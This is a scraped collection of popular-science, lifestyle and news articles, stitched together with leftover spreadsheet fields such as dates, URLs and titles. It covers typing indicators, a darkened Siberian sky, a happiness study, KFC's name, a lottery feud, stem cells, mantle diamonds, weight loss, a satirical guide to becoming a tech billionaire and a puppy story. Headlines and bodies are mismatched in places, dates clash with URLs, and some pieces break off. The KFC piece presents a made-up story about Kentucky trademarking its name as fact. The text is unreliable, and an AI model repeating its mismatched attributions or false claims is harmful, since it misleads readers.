As for other platforms, they seem to work in much the same way. Facebook wasn’t quite as detailed in their response but Messenger’s typing indicator is pretty simple Hany Barakat, Engineering Manager at Messenger, told us.

You will only see the typing indicator when a person is actively typing, so it won’t show up if someone has simply entered the text box and might not actively be engaging with the conversation.



It will no longer appear once the person stops typing.



Our tests showed that the typing indicator shows up immediately in Messenger as soon as a single character is entered, even if that character is a space, and the indicator disappears 5-1o seconds later if no more characters are entered.

Advertisement

Apple didn’t respond to our request for info, but our own informal test showed that iMessage’s typing indicator appears as soon as a single character is typed, and spaces without any characters activate it. It takes five seconds to disappear if you clear the text field and 60 seconds to go away if you simply stop typing. It also pops up if you load a picture without sending.

Auerbach doesn’t particularly have regrets about the typing indicator but understands that it’s come to have a different place in our stressful multi-tasking lives. He does believe that every service should make it an option that can be shut off, and it definitely shouldn’t be included on every messaging platform. “That’s one thing I can think of that would make Twitter even worse,” he deadpans. For the love of god, Twitter, don’t get any ideas.

What Caused The Sun To Mysteriously Disappear For Three Hours
Last Week?

Parts of Siberia experienced a bit of a bizarre phenomenon last week, when the Sun completely disappeared for several hours.

The incident took place in the Russian republic of Yakutia (also called Sakha), home to some of the coldest cities in the world, notes Live Science, with less than two hours of sunlight in the winter. In early July, they get up to 24 hours of sunlight, down to about 20 hours by mid-July.

So locals in the districts of Eveno-Bytantaisky and Zhigansky were reportedly a bit dismayed when the Sun disappeared for about three hours in the middle of the day on Friday, July 20.

“The sun went out around 11am, and didn’t come back until about 2pm,” one resident said, reported The Siberian Times. “I couldn’t see a thing without switching lights on. We took torches to walk outside, but actually no-one wanted to be on the street because the feeling was as if something heavy in the air was pressing on your chest.”

The sky went dark for about three hours on Friday, July 20. The Siberian Times

When the Sun eventually returned, everything had been covered in a thick layer of dust. The obvious culprit appears to be the wildfires raging elsewhere in Siberia. These have been burning across a huge area about twice the size of Houston. Some of the smoke from these fires even reached Canada.

While that explanation might seem pretty obvious, that didn’t stop some rather bizarre conspiracy theories from sprouting up. In another story on The Siberian Times, locals thought the dark sky might have been caused by everything from a US satellite to, yes, UFOs. Some people apparently even thought it was an unreported solar eclipse, which is literally impossible, while others blamed “devilry”.

It looks like wildfires were probably the culprit. The Siberian Times

We hate to rain on the conspiracy parade, but this was almost definitely the result of wildfires and not some unknown phenomenon. It’s currently wildfire season in Siberia, with hundreds of fires having burned thousands of acres of forest since May, watched by NASA satellites.

Still, it did make for some rather impressive photos. And when you’ve been waiting all year for prolonged sunshine and temperatures to rise, it’s probably a bit annoying when it suddenly disappears for a few hours.

These Two Years Are Officially the Happiest of Your Life

Esme Benjamin Wellness Editor 25 October 2017 View

When you reflect on your life are there certain years that stick out as particularly joy-filled? The year you could legally order yourself a cocktail? Your time at university? When you finally got your dream job? Researchers have discovered that happiness peaks at two points in life, and even though one might be behind you, the other is yet to come.

The Centre of Economic Performance at the London School of Economics and Political Science interviewed 23,000 German adults aged 17–85, quizzing them on their life satisfaction and asking them to predict how happy they envisioned being in five years time. That exact time later, those same people were re-interviewed to see if the reality matched their expectations.

What the team discovered was a happiness U-curve between ages 20 and 70, with joy peaking at 23 and 69. Twenty-three is typically an age when we’re full of momentum and optimism about the future, which makes it the more predictable of the two, perhaps. Sixty-nine, however, is possibly an age when the stresses of the unknown are behind us and we can enjoy the fruits of our labor, both professional and personal.",These Two Years Are Officially the Happiest of Your Life,

The hotel’s there to help, and has all kinds of local information like whether there’s a massive football match, getaway weekend or a religious holiday.""

While time is indeed money — especially on vacation — you may be surprised to learn that due to bus lanes or a closed bridge, that a bus or subway route is actually faster than a taxi.

5 Things That Are Almost as Deadly as Smoking, According to
Science
",24/07/2018 16:59,https://www.sciencealert.com/5-little-known-things-that-are-deadly-as-smoking-lonely-sitting-tanning-science,"Cigarette smoking, one of the least healthy habits out there, is quickly disappearing in the United States. The rate of American adults who smoke has declined from 42 percent in 1965 to 15 percent in 2015.

However, there are a number of risk factors taking its place, many of which stem from people's growing preference for sedentary, isolated lifestyles. As smoking makes its exit in the US, here are the risk factors science says to keep an eye on.

Loneliness

The growth of social media and waning in-person contact has led Former Surgeon General Vivek Murthy to label loneliness a worldwide epidemic. And it could be lethal.

Julianne Holt-Lunstad, a professor of psychology at Brigham Young University, has found in her research that loneliness reduces people's life spans by the equivalent of smoking 15 cigarettes a day.

Sitting

Sitting all day increases risk for a raft of different cancers, a 2014 study found.

Researchers included in their meta-analyses - the gold-standard for research - data from four million people involving how often they sat to watch TV, do work, and commute.

Each two-hour increase in sitting time upped people's risks for colon, endometrial, and lung cancers, regardless of whether they still exercised during the day.

Sleep loss

The Centers for Disease Control and Prevention have called sleep deprivation a public health problem, as some 50 to 70 million people in the US have sleep or wakefulness disorder.

Professor Valery Gafarov, of the World Health Organisation, noted in 2015 that insufficient sleep raises the risk of stroke and heart attack to similar degrees as regular cigarette use.

""Poor sleep should be considered a modifiable risk factor for cardiovascular disease along with smoking, lack of exercise, and poor diet,"" he said.

Tanning

Indoor tanning may seem like a more controlled version of regular sunbathing, but both are potentially more dangerous than smoking.

In 2014, researchers published a study in JAMA that found indoor tanning alone led to more cases of skin cancer than smoking did with lung cancer.

""Given the large number of skin cancer cases attributable to indoor tanning, these findings highlight a major public health issue,"" the investigators wrote.

Poor diet

A wealth of evidence has found that sugary, processed foods high in saturated fats can expose people to potentially fatal diseases at similar, if not greater, rates than smoking.

In 2016, researchers studying the mortality risks from poor diet concluded the death rates exceeded those of alcohol, drugs, unprotected sex, and tobacco combined.

Astronaut Explains Depressing Reason We've Never Been Back To
The Moon

This past Friday marked 50 years since man first walked on the moon, it was the pinnacle of human achievement and yet despite landing 12 people up there, doing some experiments, dropping some flags, grabbing some rocks and playing a bit of golf no one has been back since December 1972.

That’s a long time between rounds, and in the 45 years since, there are plenty of reasons to go back. A moon base could be the perfect space-based petrol station for further exploration of deep space, make trips to Mars a little more bearable and, well, how cool would it be to go on your holidays and look down on everyone on Earth.

Taking just three days to reach it’s not even that much more of a stretch than a long-haul flight to the other side of the planet or a drive across the UK to the West Country.

Astronaut Chris Hadfield, the first Canadian to walk in space and a man who has played the International Space Station guitar, told Business Insider:

A permanent human research station on the moon is the next logical step. It’s only three days away. We can afford to get it wrong and not kill everybody. And we have a whole bunch of stuff we have to invent and then test in order to learn before we can go deeper out.

Advert 10

But the very simple restraints of inventing some stuff and not killing everyone are not the only hurdles standing in the way of again playing among the stars. It all comes down to the classic issue that rears its head in most situations. Money.

Wikipedia

As much as a same day cross country train ticket can cost roughly the same as a package city break in Europe, space travel doesn’t come cheap. And while a billionaire sits in the Oval Office and has plans to get astronauts to ‘the vicinity of the moon’ sometime in 2023, the nature of politics itself hangs over future trips to the moon and back.

Hadfield added:

Advert 10

Why would you believe what any president said about a prediction of something that was going to happen two administrations in the future? That’s just talk.

Even the most trustworthy of politicians would have a hard time negotiating such a bigly conundrum, and that would be if the money was there to be spent. NASA’s budget is a fraction of what it was during the space race of the 1960s.

NASA

Apollo 7 astronaut Walter Cunningham said in a congressional testimony in 2015:

Advert 10

NASA’s portion of the federal budget peaked at 4% in 1965. For the past 40 years it has remained below 1%, and for the last 15 years it has been driving toward 0.4% of the federal budget.

Add to that President Trump’s ever-changing positions – he first called for a return to the moon and then a trip to Mars – with cancellations of programmes creating a loss of about $20 billion.

In 2005 a NASA report estimated a trip to the moon would cost approximately $104bn ($133bn today adjusted for inflation). The Apollo programme cost around $120bn in today’s money.

Advert 10

Cunningham said:

Manned exploration is the most expensive space venture and, consequently, the most difficult for which to obtain political support.

Scientific American reports he added:

Unless the country, which is Congress here, decided to put more money in it, this is just talk that we’re doing here. NASA’s budget is way too low to do all the things that we’ve talked about doing here this afternoon.

But as NASA faces budgetary restraint, there is hope from the private sector in the form of billionaires such as Elon Musk with SpaceX and Amazon’s Jeff Bezos and his secretive aerospace company Blue Origin.

Jeffery Hoffman, an astronaut with over 1,200 hours in space and 21.5 million miles travelled under his belt, told a roundtable this year:

There’s this generation of billionaires who are space nuts, which is great. The innovation that’s been going on over the last 10 years in spaceflight never would’ve happened if it was just NASA and Boeing and Lockheed. Because there was no motivation to reduce the cost or change the way we do it. There’s no question: If we’re going to go farther, especially if we’re going to go farther than the moon, we need new transportation. Right now we’re still in the horse-and-buggy days of spaceflight.

The real reason KFC changed its name from Kentucky Fried Chicken

",21/07/2018 13:40,https://www.tasteofhome.com/article/the-real-reason-kfc-changed-its-name-from-kentucky-fried-chicken/,"The fried chicken chain had a simple reason to change its name—and it's not what you've probably heard.

It’s no secret that KFC sells addictive fried chicken to the masses cooked with a special pressure fryer and a “secret” 11 spice and herb blend. But, the company has changed its name to and from “Kentucky Fried Chicken” over the years—and has sparked numerous conspiracy theories as to why.

One of those popular theories (that has been proven false!) is that KFC was forced to change their name because of the word “chicken.” Rumors that the brand was reportedly using “mutant” chemically engineered birds sparked this wacky idea. Outside of chicken conspiracy theories, the company claimed publicly that the name change from Kentucky Fried Chicken to KFC was to shy away from the word “fried” for potential health-conscious patrons. Find out the things your fast food worker isn’t telling you.

The real reason KFC changed its name from Kentucky Fried Chicken in 1991? It all happened because of a trademark issue.

Here’s what actually went down: First, the Commonwealth of Kentucky trademarked its name in 1990. Kentucky was capitalizing on the various brands and products using their name to alleviate debt—and this included the fast-food fried chicken chain. Thus, anyone using “Kentucky” for their business would first need the state’s permission and would also be required to pay licensing fees. Kentucky Fried Chicken rebranded to KFC instead.

Other companies and products followed suit and also changed their names. For example, “The Kentucky Derby” became “The Run for the Roses.” Neil Diamond’s song “Kentucky Woman” no longer played on the radio due to the newly imposed fee.

That said, in November 2016, KFC and the State of Kentucky settled over the use of the trademarked word “Kentucky,” with the chain then announcing they would resume their old name. Now, read about the secret that makes KFC’s fried chicken so crispy.

Here's how much the average wedding costs—and it's outrageous

",21/07/2018 11:32,https://www.cnbc.com/2020/02/13/how-much-the-average-wedding-cost-in-2019.html,"Weddings aren't cheap. In the U.S., weddings cost an average of $33,900 in 2019, including all the expenses related to the engagement ring, ceremony and reception, according to the latest Real Weddings study from The Knot.

That's just $31 less than the average cost of a wedding in 2018, and a significant drop from 2016 when couples spent $35,309 on average. This trend toward spending less has to do with the fact that people are becoming more cost-conscious about wedding planning, The Knot says.

A majority of couples (69%) think budgeting is one of the most important elements when planning a wedding, second only to guest experience, the study finds. ""With [the average] couple covering nearly half of [their] wedding costs, they're much more likely to prioritize and allocate budget to wedding details they find to be the most important while saving money on the rest,"" Kristen Maxwell-Cooper, editor-in-chief of The Knot, tells CNBC Make It.

Deciding which components to have at your wedding is a highly personal decision. ""A foodie couple may prioritize unique experiential catering options, while a music-obsessed couple may splurge on a well-known DJ or standout band,"" Maxwell-Cooper says.

When narrowing down your wedding must-haves, it's helpful to know that more than 50% of people who married in the past 10 years agree that spending on the bride's dress, the wedding cake and photography were worth the money, a 2019 survey from Novi Financial Inc found.

On the other hand, 48.5% of those polled said wedding planners weren't worth the cost, followed by 36.7% who said videography and 36.1% who said wedding favors.",Here's how much the average wedding cost in 2019,

Four brutal words after lotto win

Canadian woman plans to sue nephew after refusing to split her winnings / Fox 4

A Canadian family bitterly divided by a C$1.23 million (NZ$1.43) lottery win have finally reached an agreement on how to split the cash.

But not everyone is convinced the outcome is fair.

News.com.au first reported on the story in July, when 19-year-old Tyrone MacInnis and his aunt Barbara Reddick discovered they had both won the top prize in the Margaree Chase the Ace lottery.

They were both awarded a giant novelty cheque bearing both their names in front of reporters — as both names had been written on the winning ticket.

The cash was split by lottery organisers down the middle, with each scoring NZ$671,500.

But moments after they were pictured with their prize, Ms Reddick, who lives in the small town of Margaree Forks in Nova Scotia, turned to her nephew and uttered four brutal words: ""See you in court.""

From that moment on, the pair were engaged in a nasty public feud.

Ms Reddick argued she never agreed to split the money with the teen, claiming she had only transferred him C$100 to buy the tickets on her behalf, and asked him to include his name on the ticket for ""good luck"", according to The Telegraph in the UK.

The CBC network reported the 57-year-old as saying her nephew ""didn't deserve"" the cash.

""He's dead to me,"" she said at the time.

""I bought the ticket. Now he's trying to lie and say I said 'split' the winnings.

""I put his name on the ticket for good luck because he's like a son to me — he was. He was lucky, but not for half a million dollars. Tyrone is getting nothing from me.""

Ms Reddick contacted her lawyers, and last month, Supreme Court judge Patrick Murray froze half of the winnings — Mr MacInnes's share — while the dispute was dealt with.

Now, it has been revealed the family has finally reached an agreement and will avoid court proceedings. Under that agreement, Ms Reddick will pocket the bulk of the winnings — around NZ$1m in total.

It means her nephew will receive just NZ$407,800 — a little more than half the money he was originally awarded.

In a statement emailed to The Globe and Mail, Ms Reddick's lawyer Adam Rodgers said both sides were happy with the result.

""The parties are pleased to announce that they have reached a resolution … They are both satisfied with the terms of the settlement,"" the statement read.

""It was reached mutually in order to avoid further court proceedings and to bring this matter to a final conclusion.

""Both parties are looking forward to putting this matter behind them, and no further media statements will be made.""

But many members of the public claimed Mr MacInnes deserved half the jackpot, with many slamming Ms Reddick for her ""greed"" and ""shameful behaviour"".

After posting a photo of Ms Reddick and Mr MacInnes on Facebook back in July, the lottery's page was flooded with opinions from strangers regarding who was in the right.

""Wow … this is such a sad case why are people so greedy. Just be thankful for what you have,"" one woman posted, while another wrote: ""She is lucky I am not the judge who will be presiding over this case because I would give the kid 75 per cent of the winnings so hopefully he can better his life.""",Canadian man loses portion of jackpot prize following family feud,

Leading Scientist Warns There's An Apocalypse Coming, And It's
Not The One You Expect
",18/07/2018 16:11,https://www.iflscience.com/health-and-medicine/stem-cells-just-finger-prick/,"Stem cells are often all over the media, and sometimes it seems like scientists take one step forward then three steps back within this field. We get excited, then it all goes quiet for a while. But recently some promising new developments have been made which could see a major progression in this field. But why is this particular research any different to anything that's been done before? Well, let's take a look.

Stem cells are like a blank slate; they haven't yet assumed a particular identity. But they have the potential to turn into a different type of specialised cell which can then go on to, for example, build a particular organ. There are two main types of stem cell; embryonic stem cells and adult stem cells. Since embryonic stem cells are obtained from early-stage embryos there are obviously important ethical considerations and many people disagree with using this type of cell. Therefore many people have focused on adult stem cells instead, which can be obtained from various places in the human body such as the bone marrow. But using bone marrow is extremely invasive, which understandably puts off donors. Scientists have been looking at alternatives, such as using easily obtainable blood samples to generate stem cells from.

When the scientists have obtained such adult cell samples, they need to transform them into a type of cell called human induced pluripotent stem cells (hiPSCs). These cells, like embryonic stem cells, have the ability to give rise to every cell type found in the body, such as brain cells, heart cells and kidney cells. But they have some advantages over embryonic stem cells, mainly because they are patient-matched; the risk for immune-rejection is therefore abolished. Previously, however, large quantities of blood have been required to do this.

hiPSCs have been successfully induced before; this isn't new. But what a group of researchers have shown in a paper published in Stem Cells Translational Medicine is that they can dramatically reduce the amount of patient blood required to do this. In fact, they have shown that a single finger-prick of blood is enough, and they induced the cells without the need for transgenes. Although the insertion of specific genes (transgenes) into the cells to induce pluripotency (the ability to turn into any other cell type) is generally the most efficient method, the risk of tumour development often outweigh the benefits. This group used a different method called cell reprogramming, and claim that to date this is the most efficient approach in the generation of hiPSCs from human blood samples.

But it doesn't stop there. Alongside proving that they could in fact use even less than a finger-prick's worth of blood, they hope to increase donors with a novel DIY blood-collection kit. This would allow individuals to collect their own samples and then send them off via courier, in a thermo box provided, to various stem cell banks which are currently being set up worldwide. This dramatically increases the number of donors that could be reached; those with mobility issues, perhaps because of physical disabilities or financial problems, and those in remote places. In particular, it could increase access to individuals with certain genotypes or diseases of interest. When the samples reach the banks they would be screened, induced, and then used in numerous applications such as disease modeling and drug screening.

The group, based at A*STAR's Institute of Molecular and Cell Biology, successfully demonstrated that the self-collected single drops of blood could be used not only for reprogramming, but blood typing and DNA sequencing also. They also managed to differentiate the reprogrammed cells into functional heart cells. The group hope that this could pave way for the development of a large-scale hiPSC bank, which has great potential for future therapeutic medicine.",Stem Cells From Just A Finger Prick,

Scientists Just Found More Than A Quadrillion Tons Of Diamonds
On Earth. There's Just One Small Problem

",17/07/2018 13:58,https://www.iflscience.com/environment/more-than-a-quadrillion-tons-of-diamonds-lay-within-the-earth/,"An international team of researchers has used sound waves to estimate the composition of the Earth’s upper mantle and they think that about a quadrillion tons of diamonds are buried somewhere over 160 kilometers (100 miles) deep beneath our feet.

The new research is reported in the journal Geochemistry, Geophysics, Geosystems and is based on decades of seismic activity data. Seismographers register the waves from all the movements within the Earth, such as earthquakes. They are mechanical waves moving at certain speeds depending on the material they go through.

Based on the data, the researchers have tried to reconstruct what the interior of the Earth is like. And that’s where they stumbled upon something interesting. There are certain areas in which the seismic waves tend to speed up without explanation. These regions are called cratonic roots and are the oldest and most immovable sections of continental tectonic plates. These are sometimes seen as upside-down mountains stretching as deep as 320 kilometers (200 miles).

To explain the seismic data, the team started playing with the possible composition of these roots. They arrived at the conclusion that if these structures contain between 1 and 2 percent diamond, then the speed of the seismic waves makes sense. This might not seem much in terms of the total amount of material in the crust and mantle, but it is 1,000 times more diamonds than expected.

""This shows that diamond is not perhaps this exotic mineral, but on the [geological] scale of things, it's relatively common,"" senior author Dr Ulrich Faul of MIT said in a statement. ""We can't get at them, but still, there is much more diamond there than we have ever thought before.""

""It's circumstantial evidence, but we've pieced it all together,"" Faul added. ""We went through all the different possibilities, from every angle, and this is the only one that's left as a reasonable explanation.""

Diamonds are formed under extremely high-temperature and high-pressure conditions found below Earth’s crust. The reason why they are rare is that they only get close to the surface in specific eruptions that carve out geological pipes made of a rock called kimberlite. A large concentration of them deep below the crust, then, is not too bizarre of a hypothesis.",Scientists Just Found More Than A Quadrillion Tons Of Diamonds On Earth. There's Just One Small Problem,

Woman Loses 155 Pounds by Cutting Out These Four Foods

Busy mom Casey Gemmell has lost 155 pounds—and she's still going! How?...
",16/07/2018 17:14,https://www.today.com/health/how-lose-weight-mom-lost-155-pounds-t103785,"About four and a half years ago, Casey Gemmell, 37, was excited to throw her son a superhero-themed first birthday party. She ordered a plus-size Bat Girl costume from Ebay and even though it was a bit too small, she wore it with confidence.

A few days after the party, the photos were posted on Facebook.

""I thought 'That's not me, what a terrible angle,'"" Gemmell, who lives in Perth, Australia, recalled. ""But then another photo was posted — from a worse angle. I kept waiting for a good angle and it never arrived.""

It was September 2012 and after Gemmell took some time to ""feel sorry"" for herself, she got serious about turning her life around. Here are the steps she took to lose 155 pounds in four years.

1. Start exercising — every day.

""I downloaded an app called 5K Runner, it specifically said it would turn anybody from a couch potato into a 5K runner in eight weeks. I thought I would prove the app wrong,"" she said.

Instead, the app proved her wrong and saved her life. At first, she would run for 30 seconds, and even that was a struggle.

""The app encouraged me while I was exercising, and it would beep to remind me to run or walk if the app had been inactive for a couple of days. Before I knew it, I had run a 5K without stopping!""

Gemmell had lost about 40 pounds just by accomplishing her 5K goal!

2. Cut out cheese, pasta, bread and soft drinks.

""I started to change my diet by just cutting out those four specific foods and nothing else,"" Gemmell said. ""It was a massive challenge because at 33, I had a lot of food tendencies that were hard to break.""

3. Realize that quick fixes don't work.

""As soon as you get off of whatever scheme you were on, you'll gain the weight back — and then some,"" Gemmell said. ""I decided that if I'm going to do it, I have to do it 100 percent the right way and take my time.""

4. Celebrate the small things.

For Gemmell, that meant being able to get out of the car without having to swivel her body sideways. She cried the first time she went on a plane and didn't need an extension for the seat belt. She celebrated being able to fit in what she called ""normal people's clothes.""

5. Don't be afraid of anything, especially the gym.

About four months into her journey, Gemmell joined a gym and started doing resistance training workouts. She started seeing definition in her body that she wasn't experiencing from just running.

Today, she runs about three or four days a week, and practices resistance training at the gym five days a week (legs on Monday, Wednesday and Friday; and arms on Tuesday and Thursday).

6. Remember that it's as much mental as it is physical.

Gemmell confessed there are days when she feels like throwing in the towel — at least once every two weeks, but she remembers the challenge is mental, too.

""I struggle to come to terms mentally with what's taking place in my life: My body is constantly changing and my brain is trying to keep up. I still hear the negative things people used to call me in the schoolyard and I still see that girl. But I'm no longer her,"" Gemmel explained.

7. Form one habit, then add another one.

For Gemmell, changing her life wasn't overwhelming because she took it one step at a time.

""I would form one habit, like eight weeks of running, and then start working on another habit,"" Gemmell explained.

Today, Gemmell is at the end of her journey, and is hoping to have surgery to remove the loose skin on her body. Casey Gemmell

8. Find a support system.

For Gemmell, her husband was her No. 1 source of support.

""He supported me 110 percent. He ran beside me every day. At first, I was scared to do it by myself, and he was always by my side,"" Gemmell recounted.

""I hope I continue on this journey and hope to motivate others. There are so many people out there like me, and I want them to know there's hope,"" Gemmell said.

Dressing like departed Apple deity Steve Jobs, convincing people you're a technology company even when you're clearly not, and good old fashioned breaking the law are just some of the easy ways you can turn your plucky young start-up into a money printing machine, without all the pesky added pressure of actually turning a profit.

But don't just take our advice. Smart people learn from their mistakes, wise ones learn from those of others, so here's a few places to get you started on the path to turning your simple idea into a slightly more complicated idea that venture capitalists will love!

SO YOU WANT TO BE A TECH BILLIONAIRE?

The first thing you'll want to do if you're an aspiring tech billionaire is drop out of whatever university you're currently studying at, preferably Harvard. Bill Gates (Microsoft) and Mark Zuckerberg (Facebook) both famously turned their back on the hallowed campus, although Zuck was almost kicked out before he could drop out. His very normal and classy FaceMash website allowed horny Harvard boys to rate the attractiveness of the women in their classes and he was threatened with expulsion, presumably for violating copyright in using images of the women since there's clearly nothing wrong with the website he made, at face value or with any more forensic a reading.

Zuckerberg moved on from his little perv website to create Facebook, which was already going off when he decided to turn his back on Harvard.

Meanwhile, having already taken an interest in computers in high school (his alma mater Lakeside Prep, one of the top 15 private schools in the United States, was one of the first to get students access to computers), Gates took official leave to focus on starting his company before actually dropping out of Harvard, meaning he could return to one of the world's most prestigious colleges if he failed.

Zuckerberg however would be forced to rely on his parents, a psychiatrist and a dentist, if he fell on hard times, though thankfully that never happened.

Of course, if you don't go to one of the most renowned universities in the world and have parents from wealthy professional backgrounds, you may want to factor this into your SWOT analysis. But really you should have thought of that before you decided to be born into those circumstances, and they should have no bearing on your access to the networks and resources you'll need to attract funding for your tech company.

BUT WAIT, I DON'T RUN A TECH COMPANY?

Where would our society be if people let simple problems like this get in the way?

Just because you've got your heart set on becoming a billionaire tech visionary, doesn't mean you need to have any kind of detailed technical nous. Steve Jobs famously never wrote any code for Apple, at least according to his co-founder Steve Wozniak.

""He wasn't an engineer and he didn't do any original design, but he was technical enough to alter and change and add to other designs,"" Mr Wozniak said answering a 2013 email from the public.

Merely having an opinion and being able to direct another person to realise your vision can be enough.

WeWork founder Adam Neuman rubbed shoulders with many high profile individuals. Photo / File

But what if your company objectively has nothing to do with technology?

Simple, just pretend that it does.

Entrepreneurs in the real estate, fitness, and even hospitality industries are beginning to realise the secret power of manifestation: if you believe you're a visionary tech company, the universe will make it so.

Real estate company WeWork, which sought a US$47 billion valuation as it prepared for a doomed IPO earlier this year, mentioned ""technology"" more than 100 times in its filings with the United States' Securities and Exchange Commission (SEC).

Multiple times that was in reference to the technology ""infrastructure"" in the offices it leases out to young entrepreneurs (possibly even you!).

Does your tech start-up's home office (which preferably will be in your garage rather than your actual home) have an NBN connection? Congratulations, your company is now backed by technology and well on the way to billions in funding.

This also provides another opportunity for you to increase your own personal net worth by turning your company into your customer, much like WeWork founder Adam Neumann did. Neumann bought several commercial properties he then leased back to WeWork to turn into office spaces.

He has since been removed from the company, so there are risks to this strategy, but he was given more than a billion dollars before walking out the door, so there are also rewards.

FAKE IT UNTIL YOU MAKE IT

This might seem like a lot to take on initially, so it can be useful to look at a case study of a young entrepreneur who managed to pull off all of the above and more.

Elizabeth Holmes dropped out of (not Harvard but still …) Stanford University to start her healthcare company Theranos when she was barely out of her teens.

The daughter of a vice-president at resources and accounting fraud firm Enron, she had a dream to revolutionise the science of blood testing by producing a small machine capable of running detailed tests on just a few drops of blood.

Using her connections and charm, Holmes managed to attract billions in funding for Theranos, however what she's perhaps most known and mocked for is her mimicry of Steve Jobs.

Holmes regularly copied his black turtleneck uniform, as well as speaking in an artificial baritone voice.

In the wake of her downfall, family members have insisted this voice is her natural one, but at least one former Theranos worker told Wall Street Journal reporter John Carreyrou (whose book Bad Blood: Secrets and Lies in a Silicon Valley Startup exists as something of a bible on Theranos' laughable rise and fall) that they'd heard Holmes speaking in a voice several octaves higher than the one she reportedly put on.

While lowering her voice can be taken as another sad example of a woman being forced to adopt male traits to be taken seriously in the tech industry, this doesn't exclude it from being objectively hilarious.

But it wasn't the only lie believed to be spread by the company.

Holmes eventually settled a lawsuit with the SEC the alleged she lied to shareholders about the blood-testing technology being used by the US Department of Defence.

Theranos was also accused of overstating its revenue, claiming it made $100 million in 2014 when it really made 0.1 per cent of that.

Many former workers at Theranos were more than happy to talk to the press about their experience, describing the culture of lying and deception, proving once again that workers do nothing but get in the way of good business, which means if you want to be a tech billionaire, you're going to want to …

EXPLOIT YOUR WORKFORCE

Princeton graduate and frat boy Jeff Bezos was a do-nothing Wall Streeter surely destined for a life of poverty before he came up with the idea that would make him the first man in the world to have more than $US100 billion, for some reason.

Amazon may have started as a little company selling books over the internet, but it has since grown into an eCommerce and web services behemoth.

The company sells pretty much anything, including shonky knock offs of existing products made by the company which appear ahead of the rivals it knocks off in searches on the site.

It also makes speakers powered by digital voice assistants that can offer you all sorts of help around the home and also occasionally send recordings of what goes on around your home to human contractors (the company has since added an option for users to tell this assistant to delete those recordings after being caught out along with Apple, Google, Microsoft and more throughout the past year).

Jeff Bezos has faced criticism for exploiting his workforce at Amazon. Photo / File

Its biggest money spinning division is one of its least talked about: the Amazon web services division that makes up the bulk of its profit.

Amazon is a massive business, and massive businesses require massive workforces.

The best workforces are seemingly ones that are pushed to their physical limits before being disposed of. This is a role best filled by robots, but until it can get those working properly, Amazon appears willing to make do with real life people.

Overwhelming reports from former and current Amazon workers detail a company that constantly monitors their employees and pushes them to the absolute edge, while of course paying them as little as possible.

The enforcement of ""Amazon pace"", described as a mixture between walking and jogging, is just one of the ways this manifests, and worker mistreatment isn't limited to the US. Employees at the Melbourne warehouse told ABC Newsearlier this year they were working under a culture of fear, forced into casual positions they could lose at any moment.

One worker described feeling ""dehumanised"", saying Amazon ""resent the fact that I'm not a robot"".

There is danger in this strategy. If worker morale falls too low, they may make the radical decision to unionise, but there are also ways around this too.

Google, once considered the coolest place in the world to work, has been facing a growing wave of backlash from employees who are beginning to realise that ping pong tables and beanbags aren't the kind of workplace perks you value beyond your early twenties.

As a very smart company run by geniuses, Google has now seemingly decided to start allegedly firing those workers at the core of the union movement within the company.

While we're still waiting to see exactly how this strategy pans out, we're sure it will be another massive success along with things like Google Glass, Wave, Circles, or other names you don't recognise.

And by now you might be thinking, ""wait, isn't suppressing unionisation efforts illegal?""

Not to worry.

When building a billion dollar mega tech corporation of your own, you're going to want to remember the sage advice of disgraced Commonwealth Bank CEO Ian Narev, ""temper your sense of justice"", and quite simply …

BREAK THE LAW

Uber, the rideshare app that touted itself as being the conduit for you to hire ""your own personal driver"" while not actually hiring any drivers of its own, experienced a meteoric rise this decade.

Part of this meteoric rise involved an aggressive expansion to all corners of the globe, frequently coming into areas formerly dominated by traditional taxi companies and disrupting them with its cheaper rides and tech powered booking system.

This expansion required routinely ignoring the rules and regulations around personal transport in many jurisdictions until they were eventually changed to favour them.

While arguments can be made that these laws were outdated and in need of updating anyway, this excuse won't work for your average marijuana dealer so they shouldn't work for billion dollar tech companies either.

Regardless of how they did it, Uber has now been allowed to stay and continue operating in most of the markets it forced its way in to.

Now if the company could finally turn over even one measly dollar in profit the venture capital investors that have been subsidising our cheap rides for the past five years can be happy.

That probably won't happen until self-driving cars (which will require further regulatory updates) reach maturity, which will finally allow Uber to replace its quasi-workforce of contracted drivers with … you guessed it: robots.

NOW IT'S YOUR TURN

By now you should be well equipped to handle all the challenges running a business could throw at you, so let's get active! Ditch that degree. Pull on that turtleneck. It's time to move fast and break things, pull yourself up by your bootstraps and begin a systematic process of lying, deceiving, or otherwise cheating your way to becoming a billionaire.

If that fails you could always try investing in the next Bitcoin.

Woman Adopts a Tiny Pet Without Knowing What It'd Grow Up To

Yumna Saloojee, a South African woman, couldn’t wait to adopt a pet. When she set her eyes on the most adorable little Alaskan malamute dog, she knew he was the one and couldn’t wait to bring him home. She always wanted a furry companion to call her very own best friend and was excited at the prospect of providing a loving home for a special little puppy. After a few months, Yumna started noticing a drastic transformation in her beautiful pooch, which left her totally baffled. Read here to find out what Yumna discovered after deciding to adopt her malamute puppy.

1. Choosing To Adopt a Pet

Usually, one of the biggest factors people take into account when choosing to adopt a pet is the size of the animal. In 2014, Yumna Saloojee from South Africa knew she wanted to adopt a dog, but size wasn’t something she really pondered over…not until something quite interesting and unexpected happened. She would have been happy with just about any kind of dog!

Big pets are fun to have around, but come with slightly more challenges and responsibilities. They require significantly more space and can be hard to handle at times. Small pets, on the other hand, are more convenient and easier to groom for the most part. Nevertheless, some people just want more to hug and cuddle with, so a bigger dog seems fun. Ultimately, it’s a personal choice depending on what you are looking for in an animal. For one woman in particular, she had her eyes set on a cute little puppy.

2. A New Furry Friend

Yumna had made the decision that it was time to finally make her dream come true, take the leap, and adopt a pet. She had been dreaming about it for quite a while and had her heart set on getting a puppy, because all she ever wanted was a furry best friend by her side all the time. Not only that, she finally felt ready to take on the responsibility of looking after a pooch companion. So out she went to find the dog of her dreams.

It did not take too much searching before she stumbled across her soon-to-be best friend: an irresistible little ball of fluff that was an Alaskan malamute. The dog was just a little furball at the time and it was impossible to imagine how much the puppy would grow. Nonetheless, Yumna had met the pup of her dreams, and realized that her life was going to change for good – in more ways than she expected.

3. The One

Yumna was absolutely ecstatic to be able to finally adopt a pet. The fact that the lucky pet would be her very first dog made it even more exciting for her. The process required a bit of searching, but once she laid her eyes on the cutest little Alaskan malamute puppy she had ever seen, her heart melted on the spot.

As soon as Yumna locked eyes with the cute and fluffy malamute, she knew that he was the right dog for her. “I fell in love the second I held him,” she told The Dodo. When she first picked him out, he was only two weeks old. Since he was so young, the dog still needed time to nurse from his mother. For that reason, Yumna had to wait a few weeks before she could bring him home. She could hardly wait for the day to come. And she was incredibly surprised when the day finally came.

4. Home Time

